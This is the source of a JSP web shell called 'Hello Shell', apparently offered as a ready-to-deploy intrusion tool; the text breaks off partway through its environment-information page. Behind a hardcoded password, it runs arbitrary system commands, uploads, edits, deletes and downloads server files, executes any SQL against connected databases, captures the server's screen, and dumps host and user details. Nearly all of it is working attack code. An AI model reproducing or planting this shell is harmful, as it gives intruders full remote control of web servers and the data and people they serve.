<%@ page contentType="text/html; charset=utf-8"%>
<%@ page import="java.io.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.nio.charset.Charset"%>
<%@ page import="java.util.regex.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.zip.ZipEntry"%>
<%@ page import="java.util.zip.ZipOutputStream"%>
<%@ page import="java.text.DecimalFormat"%>
<%@ page import="java.net.InetAddress"%>
<%@ page import="java.awt.Dimension"%>
<%@ page import="java.awt.Toolkit"%>
<%@ page import="java.awt.image.BufferedImage"%>
<%@ page import="java.awt.Rectangle"%>
<%@ page import="java.awt.Robot"%>
<%@ page import="javax.imageio.ImageIO"%>
<%!
    /*
     * Code by Kenn
     * QQ: 921506
     */
    private String myPassword = "hello";
    private String shellName = "Hello Shell"; //title
    /*
    * 骷髅标志：\u2620   星月标志：\u262a 外星人标志：\ud83d\udc7d
    */
    private String loginIcon = "\u2620";
    private int sessionOutTime = 30; //minutes
    private static String language = "ENG"; //default language: ENG or CHN;
    private String encodeType = "utf8";
    //welcome info of login page
    public static String welcomeMsg(){
        return orChinese("Welcome for coming","你丫又来了");
    }

    private enum Operation{Edit,Delete,Rename,Download;}
    private String curPath;
    private boolean isDBconnected = false;
    private Connection conn = null;
    private Statement dbStatement = null;

    private static Map<String,String> textMap = null;
    
    static{
        initMap();
    }

    public static void initMap(){
        if (textMap==null){
            textMap = new HashMap<String,String>();
            textMap.put("Environment", "系统环境");
            textMap.put("File Manager", "文件管理");
            textMap.put("File Search", "文件搜索");
            textMap.put("Command", "命令行");
            textMap.put("Database", "数据库");
            textMap.put("Screen Capture", "屏幕采集");
            textMap.put("Logoff", "退出");
            textMap.put("OS", "操作系统");
            textMap.put("Computer Name", "计算机名");
            textMap.put("Available Processors", "处理器可用核心数");
            textMap.put("IP", "IP地址");
            textMap.put("System Driver", "系统盘符");
            textMap.put("Driver Info", "磁盘信息");
            textMap.put("User Name", "用户名");
            textMap.put("User DNS Domain", "用户域");
            textMap.put("User Domain", "帐户的域名称");
            textMap.put("User Profile", "用户目录");
            textMap.put("All User Profile", "用户公共目录");
            textMap.put("Temp", "用户临时文件目录");
            textMap.put("Program Files", "默认程序目录");
            textMap.put("AppData", "应用程序数据目录");
            textMap.put("System Root", "系统启动目录");
            textMap.put("Console", "控制台");
            textMap.put("File Executable", "可执行后缀");
            textMap.put("My Path", "本程序绝对路径");
            textMap.put("User Dir", "当前用户工作目录");
            textMap.put("Protocol", "网络协议");
            textMap.put("Server Info", "服务器软件版本信息");
            textMap.put("JDK Version", "JDK版本");
            textMap.put("JDK Home", "JDK安装路径");
            textMap.put("JVM Version", "JAVA虚拟机版本");
            textMap.put("JVM Name", "JAVA虚拟机名");
            textMap.put("Class Path", "JAVA类路径");
            textMap.put("Java Library Path", "JAVA载入库搜索路径");
            textMap.put("Java tmpdir", "JAVA临时目录");
            textMap.put("Compiler", "JIT编译器名");
            textMap.put("Java ext dirs", "扩展目录路径");
            textMap.put("Remote Addr", "客户机地址");
            textMap.put("Remote Host", "客户机器名");
            textMap.put("Remote User", "客户机用户名");
            textMap.put("Scheme", "请求方式");
            textMap.put("Secure", "应用安全套接字层");
            textMap.put("Yes", "是");
            textMap.put("No", "否");
            textMap.put("Edit", "编辑");
            textMap.put("Delete", "删除");
            textMap.put("Rename", "重命名");
            textMap.put("Download", "下载");
            textMap.put("File Name", "文件名");
            textMap.put("Size", "大小");
            textMap.put("Operation", "操作");
            textMap.put("GOTO", "跳转");
            textMap.put("Home", "家目录");
            textMap.put("Select", "选择");
            textMap.put("Upload", "上传");
            textMap.put("Create File", "创建文件");
            textMap.put("Create Folder", "创建文件夹");
            textMap.put("Wrong Password","密码错误");
            textMap.put("Folder name is null","文件夹名为空");
            textMap.put("Content is null","内容为空");
            textMap.put("File name is null","文件名为空");
            textMap.put("Search from","搜索目录");
            textMap.put("Search for file type","文件的后缀名");
            textMap.put("Setting","设置");
            textMap.put("Search by Name","按名称搜索");
            textMap.put("Search by Content","按内容搜索");
            textMap.put("Ignore Case","忽略大小写");
            textMap.put("Search keyword","关键词");
            textMap.put("Search","搜索");
            textMap.put("Execute","执行");
            textMap.put("Connect","连接");
            textMap.put("Disconnect","断开");
            textMap.put("Database Type","数据库类型");
            textMap.put("Driver","驱动程序");
            textMap.put("Host","主机地址");
            textMap.put("Port","端口号");
            textMap.put("DB Name","数据库名");
            textMap.put("Username","用户名");
            textMap.put("Password","密码");
            textMap.put("SQL","SQL语句");
            textMap.put("File is already exist","文件已存在");
            textMap.put("Folder is empty","文件夹为空");
            textMap.put("Bad command","错误的命令");
            textMap.put("Save","保存");
            textMap.put("Return Back","返回");
            textMap.put("is not a text file","不是文本文件");
            textMap.put("File can not be writed","文件不可写");
            textMap.put("Save success","保存成功");
            textMap.put("Exception","异常");
            textMap.put("Folder already exist","文件夹已存在");
            textMap.put("File already exist","文件已存在");
            textMap.put("File upload success","文件上传成功");
            textMap.put("File upload failed","文件上传失败");
            textMap.put("connect failed","连接失败");
            textMap.put("connect success","连接成功");
            textMap.put("Can not connect to database","不能连接到数据库");
            textMap.put("Invalid SQL","无效的SQL");
            textMap.put("result","结果");
            textMap.put("SQL execute failed","SQL执行失败");
            textMap.put("SQL execute success","SQL执行成功");
            textMap.put("Free, Total","可用,共");
            textMap.put("Please input new name","请输入新的名字");
            textMap.put("Name can not be null","名字不可为空");
            textMap.put("Refresh","刷新");
        }
    }
    public static String orChinese(String key){
        return "CHN".equalsIgnoreCase(language)
                ? textMap.get(key)
                : key;
    }
    public static String orChinese(String english, String chinese){
        textMap.put(english, chinese);
        return orChinese(english);
    }
    public List<File> getFolderList(String path) {
        List<File> rtnList = new ArrayList<File>();
        File file = new File(path);
        if (file.exists() && file.isDirectory()) {
            File[] listFiles = file.listFiles(new FileFilter() {
                public boolean accept(File pathname) {
                    return pathname.isDirectory();
                }
            });
            rtnList.addAll(Arrays.asList(listFiles));
        }
        return rtnList;
    }

    public List<File> getFileList(String path) {
        List<File> rtnList = new ArrayList<File>();
        File file = new File(path);
        if (file.exists() && file.isDirectory()) {
            File[] listFiles = file.listFiles(new FileFilter() {
                public boolean accept(File pathname) {
                    return pathname.isFile();
                }
            });
            rtnList.addAll(Arrays.asList(listFiles));
        }
        return rtnList;
    }

    public class MyFile extends File {

        private String htmlOperation;
        private String requestUrl;

        public MyFile(String pathname, String requestUrl) {
            super(pathname);
            this.requestUrl = requestUrl;
        }

        public String getHtmlOperation() {
            return htmlOperation;
        }

        public void setHtmlOperation(Operation... Opers) {
            this.htmlOperation = "";
            for (Operation o : Opers) {
                if (o.equals(Operation.Rename)) {
                    String url = requestUrl + "&fsAction=" + o + "&fileName=" + this.getName();
                    htmlOperation += "&nbsp;<a href=\"#\" onclick=\"rename('" + url + "','"
                            + orChinese("Please input new name") + "','" + orChinese("Name can not be null") + "')\">"
                            + orChinese(o.toString()) + "</a>&nbsp;";
                } else {
                    htmlOperation += "&nbsp;<a href=\"" + requestUrl + "&fsAction=" + o + "&fileName=" + this.getName()
                            + "\">" + orChinese(o.toString()) + "</a>&nbsp;";
                }
            }
        }

        public String getLength() {
            if (this.isDirectory())
                return "";
            return getSize(this.length());
        }
    }

    public static String getSize(long size) {
        DecimalFormat df = new DecimalFormat("0.00");
        if (size >> 40 >= 1)
            return df.format((float) size / 1024 / 1024 / 1024 / 1024) + " TB";
        if (size >> 30 >= 1)
            return df.format((float) size / 1024 / 1024 / 1024) + " GB";
        else if (size >> 20 >= 1)
            return df.format((float) size / 1024 / 1024) + " MB";
        else if (size >> 10 >= 1)
            return df.format((float) size / 1024) + " KB";
        else
            return df.format((float) size) + " B ";
    }

    public void download(String path, HttpServletResponse response) throws Exception {
        try {
            File file = new File(path);
            String filename = file.getName();
            String ext = filename.substring(filename.lastIndexOf(".") + 1).toUpperCase();
            InputStream fis = new BufferedInputStream(new FileInputStream(path));
            byte[] buffer = new byte[fis.available()];
            fis.read(buffer);
            fis.close();
            response.reset();
            response.addHeader("Content-Disposition",
                    "attachment;filename=" + new String(filename.getBytes(), "ISO-8859-1"));
            response.addHeader("Content-Length", "" + file.length());
            OutputStream toClient = new BufferedOutputStream(response.getOutputStream());
            response.setContentType("application/octet-stream");
            toClient.write(buffer);
            toClient.flush();
            toClient.close();
        } catch (IOException ex) {
            throw ex;
        }
    }

    public static File createZip(String sourcePath, String zipPath) throws Exception {
        FileOutputStream fos = null;
        ZipOutputStream zos = null;
        try {
            File zipFile = new File(zipPath);
            if (zipFile.exists()) {
                throw new Exception(orChinese("File is already exist") + ": " + zipFile.getName());
            }
            File srcFolder = new File(sourcePath);
            if (!srcFolder.exists() || srcFolder.listFiles().length == 0) {
                throw new Exception(orChinese("Folder is empty") + ": " + srcFolder.getName());
            }
            fos = new FileOutputStream(zipPath);
            zos = new ZipOutputStream(fos);
            writeZip(new File(sourcePath), "", zos);
            return zipFile;
        } catch (Exception e) {
            throw e;
        } finally {
            try {
                if (zos != null)
                    zos.close();
                if (fos != null)
                    fos.close();
            } catch (Exception e) {
                throw e;
            }
        }
    }

    private static void writeZip(File file, String parentPath, ZipOutputStream zos) throws Exception {
        if (!file.exists())
            return;
        if (file.isDirectory()) {
            parentPath += file.getName() + File.separator;
            File[] files = file.listFiles();
            for (File f : files) {
                writeZip(f, parentPath, zos);
            }
        } else {
            FileInputStream fis = null;
            DataInputStream dis = null;
            try {
                fis = new FileInputStream(file);
                dis = new DataInputStream(new BufferedInputStream(fis));
                ZipEntry ze = new ZipEntry(parentPath + file.getName());
                zos.putNextEntry(ze);
                byte[] content = new byte[1024];
                int len;
                while ((len = fis.read(content)) != -1) {
                    zos.write(content, 0, len);
                    zos.flush();
                }
            } catch (Exception e) {
                throw e;
            } finally {
                try {
                    if (dis != null)
                        dis.close();
                    if (fis != null)
                        fis.close();
                } catch (Exception e) {
                    throw e;
                }
            }
        }
    }

    public String exeCmd(String cmd) {
        Runtime runtime = Runtime.getRuntime();
        Process proc = null;
        String retStr = "";
        InputStreamReader insReader = null;
        char[] tmpBuffer = new char[1024];
        int nRet = 0;

        try {
            proc = runtime.exec(cmd);
            insReader = new InputStreamReader(proc.getInputStream(), Charset.forName("GB2312"));

            while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {
                retStr += new String(tmpBuffer, 0, nRet) + "\n";
            }
            insReader.close();
            retStr = HTMLEncode(retStr);
            return retStr;
        } catch (Exception e) {
            retStr = "<font color=\"red\">" + orChinese("Bad command") + ": \"" + cmd + "\"</font>";
            return retStr;
        }
    }

    public String HTMLEncode(String str) {
        str = str.replaceAll(" ", "&nbsp;");
        str = str.replaceAll("<", "&lt;");
        str = str.replaceAll(">", "&gt;");
        str = str.replaceAll("\r\n", "<br>");
        return str;
    }

    public String Unicode2GB(String str) {
        String sRet = null;
        if (str == null)
            return "";
        try {
            sRet = new String(str.getBytes("ISO8859_1"), encodeType);
        } catch (Exception e) {
            sRet = str;
        }

        return sRet;
    }

    public String pathConvert(String path) {
        String sRet = path.replace('\\', '/');
        File file = new File(path);
        if (file.getParent() != null) {
            if (file.isDirectory()) {
                if (!sRet.endsWith("/"))
                    sRet += "/";
            }
        } else {
            if (!sRet.endsWith("/"))
                sRet += "/";
        }
        return sRet;
    }

    public String searchFile(String path, String content, String subfix, boolean byname, boolean ignoreCase) {
        List<String> list = new ArrayList<String>();
        searchFile(list, path, content, subfix, byname, ignoreCase);
        StringBuilder sb = new StringBuilder();
        for (String line : list) {
            sb.append(line.replace("\\", "/") + "<br>");
        }
        return sb.toString();
    }

    private void searchFile(List<String> list, String path, String content, String subfix, boolean byname,
            boolean ignoreCase) {
        path = pathConvert(path);
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            if (dir.list() != null && dir.list().length > 0) {
                for (File f : dir.listFiles()) {
                    if (!f.isDirectory()) {
                        String fname = f.getName();
                        String srcStr = f.getName();
                        if (containsSubfix(fname, subfix.split(" "))) {
                            if (!byname) {
                                srcStr = readText(f);
                            }
                            if (ignoreCase) {
                                content = content.toUpperCase();
                                srcStr = srcStr.toUpperCase();
                            }
                            if (srcStr.contains(content)) {
                                list.add(f.getAbsolutePath());
                            }
                        }
                    } else {
                        searchFile(list, f.getAbsolutePath(), content, subfix, byname, ignoreCase);
                    }
                }
            }
        }
    }

    private boolean containsSubfix(String name, String[] subfixs) {
        boolean rtn = false;
        if (subfixs == null || subfixs.length == 0)
            return rtn;
        for (String ext : subfixs) {
            if (name.toUpperCase().endsWith(ext.toUpperCase())) {
                rtn = true;
            }
        }
        return rtn;
    }

    public static String readText(File file) {
        StringBuilder sb = new StringBuilder();
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), "GB2312"));
            String str = null;
            while ((str = reader.readLine()) != null) {
                sb.append(str);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                reader.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return sb.toString();

    }

    public String openFile(String path, String fileName, String curUri) {
        String sRet = "";
        String fileString = null;
        File curFile = null;
        path = pathConvert(path);
        try {
            fileString = "";
            curFile = new File(path, fileName);
            FileReader fileReader = new FileReader(curFile);
            char[] chBuffer = new char[1024];
            int nRet;
            while ((nRet = fileReader.read(chBuffer, 0, 1024)) != -1) {
                fileString += new String(chBuffer, 0, nRet);
            }
            if (fileString != null) {
                sRet += "<table align=\"center\" width=\"100%\" cellpadding=\"2\" cellspacing=\"1\">\n";
                sRet += "    <form name=\"openfile\" method=\"post\" action=\"" + curUri + "&curPath=" + path
                        + "&fsAction=save" + "\">\n";
                sRet += "    <input type=\"hidden\" name=\"fileName\" value=\"" + fileName + "\" />\n";
                sRet += "    <tr>\n";
                sRet += "        <td>[<a href=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\">"
                        + orChinese("Return Back") + "</a>]</td>\n";
                sRet += "    </tr>\n";
                sRet += "    <tr>\n";
                sRet += "        <td align=\"left\">\n";
                sRet += "            <textarea name=\"fileContent\" class=\"trans\" style=\"display:block;width:100%\" rows=\"32\" >\n";
                sRet += HTMLEncode(fileString).replace("<br>", "\r\n");
                sRet += "            </textarea>\n";
                sRet += "        </td>\n";
                sRet += "    </tr>\n";
                sRet += "    <tr>\n";
                sRet += "        <td align=\"center\"><input type=\"submit\" class=\"trans\" value=\""
                        + orChinese("Save") + "\" /></td>\n";
                sRet += "    </tr>\n";
                sRet += "    </form>\n";
                sRet += "</table>\n";
            }
            fileReader.close();
        } catch (IOException e) {
            sRet = "<font color=\"red\">\"" + path + "\" " + orChinese("is not a text file") + "</font>";
        }
        return sRet;
    }

    public String saveFile(String path, String fileName, String curUri, String fileContent) {
        String sRet = "";
        File file = null;

        path = pathConvert(path);

        try {
            file = new File(path, fileName);

            if (!file.canWrite()) {
                sRet = "<font color=\"red\">" + orChinese("File can not be writed") + "</font>";
            } else {
                FileWriter fileWriter = new FileWriter(file);
                fileWriter.write(fileContent);

                fileWriter.close();
                sRet = orChinese("Save success") + "!\n";
                sRet += "<meta http-equiv=\"refresh\" content=\"1;url=" + curUri + "&curPath=" + path
                        + "&fsAction=list\" />\n";
            }
        } catch (IOException e) {
            sRet = "<font color=\"red\">" + orChinese("Exception") + ": " + e.getMessage() + "</font>";
        }
        return sRet;
    }

    public String createFolder(String path, String fileName, String url) {
        try {
            File file = new File(path, fileName);
            if (file.exists())
                return orChinese("Folder already exist") + "!";
            else
                file.mkdirs();
        } catch (Exception e) {
            return "<font color=\"red\">" + orChinese("Exception") + ": " + e.getMessage() + "</font>";
        }
        return "<meta http-equiv=\"refresh\" content=\"0;url=" + url + "&curPath=" + path + "&fsAction=list\" />";
    }

    public String createFile(String path, String fileName, String url) {
        try {
            File file = new File(path, fileName);
            if (file.exists())
                return orChinese("File already exist") + "!";
            else
                file.createNewFile();
        } catch (Exception e) {
            return "<font color=\"red\">" + orChinese("Exception") + ": " + e.getMessage() + "</font>";
        }
        return "<meta http-equiv=\"refresh\" content=\"0;url=" + url + "&curPath=" + path + "&fsAction=list\" />";
    }

    public String deleteFile(String path, String fileName, String url) {
        File file = new File(path, fileName);
        if (file.exists())
            file.delete();
        return "<meta http-equiv=\"refresh\" content=\"0;url=" + url + "&curPath=" + path + "&fsAction=list\" />";
    }

    public String download(String path, String fileName, String url, HttpServletResponse response) {
        String rtnStr = "";
        File file = new File(path, fileName);
        File downFile = null;
        if (!file.exists())
            return null;
        try {
            if (file.isDirectory()) {
                file = createZip(file.getAbsolutePath(), file.getAbsolutePath() + ".zip");
            }
            download(file.getAbsolutePath(), response);
        } catch (Exception e) {
            rtnStr = e.getMessage();
        }
        return rtnStr;
    }

    public String rename(String path, String fileName, String newFile, String url) {
        File file = new File(path, fileName);
        File nFile = new File(path, newFile);
        if (file.exists()) {
            file.renameTo(nFile);
        }
        return "<meta http-equiv=\"refresh\" content=\"0;url=" + url + "&curPath=" + path + "&fsAction=list\" />";
    }

    public String uploadFile(ServletRequest request, String path, String curUri) {
        String sRet = "";
        File file = null;
        InputStream in = null;
        path = pathConvert(path);
        try {
            in = request.getInputStream();
            byte[] inBytes = new byte[request.getContentLength()];
            int nBytes;
            int start = 0;
            int end = 0;
            int size = 1024;
            String token = null;
            String filePath = null;
            while ((nBytes = in.read(inBytes, start, size)) != -1) {
                start += nBytes;
            }
            in.close();
            int i = 0;
            byte[] seperator;

            while (inBytes[i] != 13) {
                i++;
            }
            seperator = new byte[i];

            for (i = 0; i < seperator.length; i++) {
                seperator[i] = inBytes[i];
            }
            String dataHeader = null;
            i += 3;
            start = i;
            while (!(inBytes[i] == 13 && inBytes[i + 2] == 13)) {
                i++;
            }
            end = i - 1;
            dataHeader = new String(inBytes, start, end - start + 1);
            token = "filename=\"";
            start = dataHeader.indexOf(token) + token.length();
            token = "\"";
            end = dataHeader.indexOf(token, start) - 1;
            filePath = dataHeader.substring(start, end + 1);
            i += 4;
            start = i;
            end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;
            File newFile = new File(path + filePath);
            newFile.createNewFile();
            FileOutputStream out = new FileOutputStream(newFile);
            out.write(inBytes, start, end - start + 1);
            out.close();

            sRet = "<script language=\"javascript\">\n";
            sRet += "alert(\"" + orChinese("File upload success") + "! " + filePath + "\");\n";
            sRet += "</script>\n";
        } catch (IOException e) {
            sRet = "<script language=\"javascript\">\n";
            sRet += "alert(\"" + orChinese("File upload failed") + "!\");\n";
            sRet += "</script>\n";
        }

        sRet += "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "\" />";
        return sRet;
    }

    public String DBConnect(String url, String username, String password) {
        String bRet = orChinese("connect failed");
        if (url != null) {
            try {
                if (username != null && username.trim().length() > 0) {
                    conn = DriverManager.getConnection(url, username, password);
                } else {
                    conn = DriverManager.getConnection(url);
                }
                dbStatement = conn.createStatement();
                bRet = orChinese("connect success");
            } catch (SQLException e) {
                bRet = orChinese("connect failed") + ": " + e.getMessage();
            }
        }
        return bRet;
    }

    public String DBExecute(String sql) {
        String sRet = "";
        if (sql == null)
            return "SQL is null";
        if (conn == null || dbStatement == null) {
            sRet = "<font color=\"red\">" + orChinese("Can not connect to database") + "</font>";
        } else {
            try {
                if (sql.length() <= 6)
                    return "<font color=\"red\">" + orChinese("Invalid SQL") + "</font>";
                if (sql.toLowerCase().substring(0, 6).equals("select")) {
                    ResultSet rs = dbStatement.executeQuery(sql);
                    ResultSetMetaData rsmd = rs.getMetaData();
                    int colNum = rsmd.getColumnCount();
                    int colType;

                    sRet = orChinese("SQL execute success") + ", " + orChinese("result") + ":<br>\n";
                    sRet += "<table align=\"center\" border=\"0\" cellpadding=\"2\" cellspacing=\"1\">\n";
                    sRet += "    <tr>\n";
                    for (int i = 1; i <= colNum; i++) {
                        sRet += "        <th>" + rsmd.getColumnName(i) + "(" + rsmd.getColumnTypeName(i) + ")</th>\n";
                    }
                    sRet += "    </tr>\n";
                    while (rs.next()) {
                        sRet += "    <tr>\n";
                        for (int i = 1; i <= colNum; i++) {
                            colType = rsmd.getColumnType(i);

                            sRet += "        <td>";
                            switch (colType) {
                            case Types.BIGINT:
                                sRet += rs.getLong(i);
                                break;

                            case Types.BIT:
                                sRet += rs.getBoolean(i);
                                break;

                            case Types.BOOLEAN:
                                sRet += rs.getBoolean(i);
                                break;

                            case Types.CHAR:
                                sRet += rs.getString(i);
                                break;

                            case Types.DATE:
                                sRet += rs.getDate(i).toString();
                                break;

                            case Types.DECIMAL:
                                sRet += rs.getDouble(i);
                                break;

                            case Types.NUMERIC:
                                sRet += rs.getDouble(i);
                                break;

                            case Types.REAL:
                                sRet += rs.getDouble(i);
                                break;

                            case Types.DOUBLE:
                                sRet += rs.getDouble(i);
                                break;

                            case Types.FLOAT:
                                sRet += rs.getFloat(i);
                                break;

                            case Types.INTEGER:
                                sRet += rs.getInt(i);
                                break;

                            case Types.TINYINT:
                                sRet += rs.getShort(i);
                                break;

                            case Types.VARCHAR:
                                sRet += rs.getString(i);
                                break;

                            case Types.TIME:
                                sRet += rs.getTime(i).toString();
                                break;

                            case Types.DATALINK:
                                sRet += rs.getTimestamp(i).toString();
                                break;
                            }
                            sRet += "        </td>\n";
                        }
                        sRet += "    </tr>\n";
                    }
                    sRet += "</table>\n";

                    rs.close();
                } else {
                    if (dbStatement.execute(sql)) {
                        sRet = orChinese("SQL execute success");
                    } else {
                        sRet = "<font color=\"red\">" + orChinese("SQL execute failed") + "</font>";
                    }
                }
            } catch (SQLException e) {
                sRet = "<font color=\"red\">" + orChinese("SQL execute failed") + "</font>";
            }
        }

        return sRet;
    }

    private void getScreenImg(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try{
            response.reset();
            response.setContentType("image/jpg");
            ServletOutputStream sos = response.getOutputStream();
            response.setHeader("Pragma", "No-cache");
            response.setHeader("Cache-Control", "no-cache");
            response.setDateHeader("Expires", 0);
            Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
            BufferedImage screenshot = (new Robot())
                    .createScreenCapture(new Rectangle(0, 0, (int) dimension.getWidth(), (int) dimension.getHeight()));
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "jpg", bos);
            byte[] buf = bos.toByteArray();
            response.setContentLength(buf.length);
            sos.write(buf);
            bos.close();
            sos.close();
        }catch(Exception e){
        }
    }

    public String getDriverInfo() {
        String str = "";
        File[] roots = File.listRoots();
        for (File file : roots) {
            str += file.getPath() + "&nbsp;(";
            str += getSize(file.getFreeSpace()) + " " + orChinese("Free, Total") + " ";
            str += getSize(file.getTotalSpace()) + ")<br>";
        }
        return str;
    }%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style>
body {font-size: 14px;font-family: &#23435; &#20307; ;color: white;background-color: black;text-align: center;padding: 5 5 5 5;}
.trans {background: transparent;margin: 1 1 1 1;color: white;}
input.textbox {border: black solid 1;font-size: 12px;height: 18px;}
textarea {border: black solid 1;}
table {border-collapse: collapse;}
table.onhover tr:hover{background:red;}
td {border: 1px dotted #FFF;height: 18px;}
.break-all {word-break: break-all;}
.oper {display: inline-block;float: left;width: 130px;border: 1px dotted #FFF;padding: 5px;margin-right: 3px;margin-bottom: 15px;height: 18px;cursor: hand;}
.container {position: absolute;margin: 2 2 2 2;top: 68px;width: 95%;}
a:link, a:visited {text-decoration: none;color: #FFF;}
a:hover {text-decoration: underline;color: #FFF;}

</style>
<script type="text/JavaScript">
    var pressKey = function() {
        if (event.keyCode == 13) {
            event.returnValue = false;
            event.cancel = true;
            loginForm.submit();
        }
    }
    var redirect = function(action) {
        var actionOption = document.getElementById('actionOption');
        actionOption.value = action;
        actionForm.submit();
    }
    var createFile = function(url){
        var filename = document.getElementById('createFileName');
        window.location.href = url + "&fileName=" + filename.value;
    }
    var rename = function(url, msg, errormsg){
        var result = prompt(msg + "：" ,"")
        if (result){
            window.location.href=url + "&newName=" + result;
        }else{
            alert(errormsg);
        }
    }
    var dbsubmit = function(fsAction){
        var form = document.getElementById("sqlform");
        form.action  += "&fsAction=" + fsAction;
        document.getElementById("sqlform").submit();
    }
    var languageChanged = function(url , oldurl){
        oldurl = oldurl.replace("&","{{and}}").replace("?","{{question}}");
        url = url + "&oldurl=" + oldurl;
        window.location.href = url;
    }
</script>
<title><%=shellName %></title>
</head>
<body>
    <%
        session.setMaxInactiveInterval(sessionOutTime * 60);
        if (request.getParameter("myPassword") == null && session.getAttribute("myPassword") == null) {
            if (request.getParameter("lang") !=null){
                language = request.getParameter("lang");
                String oldurl = request.getParameter("oldurl");
                String str = "<meta http-equiv=\"refresh\" content=\"0;url="+oldurl+"\" />";
                out.println(str);
                out.flush();
            }
    %>
    <font style="font-size: 300px; color: white"><% out.println(loginIcon); %></font>
    <form name="loginForm">
        <font size=4><%=welcomeMsg() %></font><br><br>
        <input class="textbox" size="30" name="myPassword" type="password" onkeydown="pressKey()" />
    </form>
    <%
        } else {
            String password = null;
            if (session.getAttribute("myPassword") == null) {
                password = (String) request.getParameter("myPassword");
                if (!myPassword.equals(password)) {
                    String rtnStr = "<div align=\"center\"><br><br><font color=\"red\">"+orChinese("Wrong Password")+"</font></div>";
                    rtnStr += "<meta http-equiv=\"refresh\" content=\"1;url=" + request.getRequestURL() + "\" />";
                    out.println(rtnStr);
                    out.flush();
                    //out.close();
                    return;
                }
                session.setAttribute("myPassword", password);
            } else {
                password = (String) session.getAttribute("myPassword");
            }

            String action = null;
            if (request.getParameter("action") == null)
                action = "env";
            else
                action = (String) request.getParameter("action");

            if (action.equals("exit")) {
                session.removeAttribute("myPassword");
                response.sendRedirect(request.getRequestURI());
                //out.close();
                return;
            }
    %>
    <form name="actionForm">
        <input id="actionOption" type="hidden" name="action" value="Environment" />
    </form>
    <div style="margin-left: 2px">
        <div class="oper" onclick="redirect('env')"><%=orChinese("Environment")%></div>
        <div class="oper" onclick="redirect('file')" id="file_system"><%=orChinese("File Manager")%></div>
        <div class="oper" onclick="redirect('search')"><%=orChinese("File Search")%></div>
        <div class="oper" onclick="redirect('command')"><%=orChinese("Command")%></div>
        <div class="oper" onclick="redirect('database')"><%=orChinese("Database")%></div>
        <div class="oper" onclick="redirect('screen')"><%=orChinese("Screen Capture")%></div>
        <div class="oper" onclick="redirect('exit')"><%=orChinese("Logoff")%></div>
    </div>
    <%  if (action.equals("lang")){
        language =     request.getParameter("lang");
        String oldurl = request.getParameter("oldurl");
        if (oldurl!= null){
            oldurl = oldurl.replace("{{and}}", "&").replace("{{question}}", "?");
        }
        String sRet = "<meta http-equiv=\"refresh\" content=\"0;url="+oldurl+"\" />";
        %>
    <div class="container break-all"><%=sRet %></div>
    <%
    }else if (action.equals("env")) {
    %>
    <table class="container break-all onhover">
        <tr>
            <td width="20%"><%=orChinese("OS") %></td>
            <td width="80%"><%=System.getProperty("os.name") + " " + System.getProperty("os.version") + " "+ System.getProperty("os.arch")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Computer Name") %></td>
            <td><%=System.getenv().get("COMPUTERNAME")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Available Processors") %></td>
            <td><%=Runtime.getRuntime().availableProcessors() %></td>
        </tr>
        <tr>
            <td><%=orChinese("IP") %></td>
            <td><%=InetAddress.getLocalHost().getHostAddress().toString() %></td>
        </tr>
        <tr>
            <td><%=orChinese("System Driver") %></td>
            <td><%=System.getenv().get("SystemDrive")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Driver Info") %></td>
            <td><%=getDriverInfo() %></td>
        </tr>
        <tr>
            <td><%=orChinese("User Name") %></td>
            <td><%=System.getenv().get("USERNAME")%></td>
        </tr>
        <tr>
            <td><%=orChinese("User Domain") %></td>
            <td><%=System.getenv().get("USERDOMAIN")%></td>
        </tr>
        <tr>
            <td><%=orChinese("User DNS Domain") %></td>
            <td><%=System.getenv().get("USERDNSDOMAIN")%></td>
        </tr>
        <tr>
            <td><%=orChinese("User Profile") %></td>
            <td><%=System.getenv().get("USERPROFILE")%></td>
        </tr>
        <tr>
            <td><%=orChinese("All User Profile") %></td>
            <td><%=System.getenv().get("ALLUSERSPROFILE")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Temp") %></td>
            <td><%=System.getenv().get("TEMP")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Program Files") %></td>
            <td><%=System.getenv().get("ProgramFiles")%></td>
        </tr>
        <tr>
            <td><%=orChinese("AppData") %></td>
            <td><%=System.getenv().get("APPDATA")%></td>
        </tr>
        <tr>
            <td><%=orChinese("System Root") %></td>
            <td><%=System.getenv().get("SystemRoot")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Console") %></td>
            <td><%=System.getenv().get("ComSpec")%></td>
        </tr>
        <tr>
            <td><%=orChinese("File Executable") %></td>
            <td><%=System.getenv().get("PATHEXT")%></td>
        </tr>
        <tr>
            <td><%=orChinese("My Path") %></td>
            <td><%=request.getSession().getServletContext().getRealPath(request.getServletPath())%></td>
        </tr>
        <tr>
            <td><%=orChinese("User Dir") %></td>
            <td><%=System.getProperty("user.dir")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Protocol") %></td>
            <td><%=request.getProtocol()%></td>
        </tr>
        <tr>
            <td><%=orChinese("Server Info") %></td>
            <td><%=application.getServerInfo()%></td>
        </tr>
        <tr>
            <td><%=orChinese("JDK Version") %></td>
            <td><%=System.getProperty("java.version")%></td>
        </tr>
        <tr>
            <td><%=orChinese("JDK Home") %></td>
            <td><%=System.getProperty("java.home")%></td>
        </tr>
        <tr>
            <td><%=orChinese("JVM Version") %></td>
            <td><%=System.getProperty("java.vm.specification.version")%></td>
        </tr>
        <tr>
            <td><%=orChinese("JVM Name") %></td>
            <td><%=System.getProperty("java.vm.name")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Class Path") %></td>
